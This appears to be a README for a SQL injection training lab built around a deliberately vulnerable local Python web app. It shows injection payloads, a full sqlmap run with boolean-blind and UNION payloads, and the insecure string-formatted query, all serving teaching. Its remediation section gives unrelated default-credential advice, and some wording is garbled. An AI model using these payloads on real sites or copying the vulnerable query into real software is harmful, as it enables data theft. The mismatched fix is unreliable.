<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/sql-injection/main/content/sql-injection.svg"></p>

An application enables users to interact with a database insecurely. A threat actor can exploit this feature by injecting a malicious query into a trusted web application. When the malicious query is executed, the application behaves shows errors. This type of behavior indicates that the attack is not blind

Clone this current repo recursively
```sh
git clone --recursive https://github.com/qeeqbox/sql-injection
```
Run the webapp using Python
```sh
python3 sql-injection/vulnerable-web-app/webapp.py
```
Open the webapp in your browser 127.0.0.1:5142
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/sql-injection/main/content/1.png"></p>
One of the routes in the web app is /user that takes an id as a parameter, it returns info about the requested user in JSON format
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/sql-injection/main/content/2.png"></p>
If you enter ', you will get: unrecognized token: "'''", which is an error indicating the user's route interacts with a database
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/sql-injection/main/content/3.png"></p>
The payload was executed successfully and caused a delay ' or '1'='1
<p align="center"> <img src="https://raw.githubusercontent.com/qeeqbox/sql-injection/main/content/4.png"></p>

```sh
user@users-Mac-mini vulnerable-web-app % sqlmap -u "http://127.0.0.1:5142/user?id=1" -p id --dbms=sqlite --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.7#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:39:38 /2025-07-26/

[13:39:38] [INFO] testing connection to the target URL
[13:39:38] [WARNING] turning off pre-connect mechanism because of incompatible server ('BaseHTTP/0.6 Python/3.13.5')
[13:39:38] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:39:38] [INFO] testing if the target URL content is stable
[13:39:39] [INFO] target URL content is stable
[13:39:39] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[13:39:39] [INFO] testing for SQL injection on GET parameter 'id'
[13:39:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:39:39] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[13:39:39] [INFO] testing 'Generic inline queries'
[13:39:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:39:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:39:39] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:39:39] [INFO] target URL appears to have 7 columns in query
[13:39:39] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 1533=1533 AND 'rZkz'='rZkz

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=-6078' UNION ALL SELECT NULL,NULL,CHAR(113,120,98,113,113)||CHAR(98,89,100,100,105,70,90,116,73,114,112,70,101,121,79,80,73,86,73,76,79,67,119,108,102,106,109,66,90,77,120,112,103,99,87,103,79,113,99,79)||CHAR(113,120,118,107,113),NULL,NULL,NULL,NULL-- OsvX
---
[13:39:39] [INFO] testing SQLite
[13:39:39] [INFO] confirming SQLite
[13:39:39] [INFO] actively fingerprinting SQLite
[13:39:39] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[13:39:39] [INFO] fetched data logged to text files under '/Users/user/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 13:39:39 /2025-07-26/
```

## Code
When you request info about user using an known id, the get_user is called
```py
elif parsed_url.path == '/user' and "id" in get_request_data:
    self.send_content_raw(200, [('Content-type', 'application/json')], self.get_user(get_request_data["id"][0]))
    return
```
The get_user() function returns info about a user using their id without checking if the id is sanitized
```py
    def get_user(self,id_=None):
        ret = b""
        try:
            if id_ != None:
                with connect(DATABASE, isolation_level=None, check_same_thread=False) as connection:
                    cursor = connection.cursor()
                    results = cursor.execute("SELECT * FROM users WHERE id='%s'" % (id_)).fetchone()
                    return dumps(results).encode('utf-8')
        except Exception as e:
            ret = str(e).encode("utf-8")
        return ret
```
```
 
## Impact
Vary

## Risk
- Unauthorized Access
- System Compromise
- Operational Disruption
- Legal and Financial Damage
  - Compliance Failures
  - Reputation Damage

## Redemption
- Disable, remove or change default credentials
- Alternative Authentication Mechanisms

## ID
91f9b046-b802-425a-b71b-64c21c6b1c0f
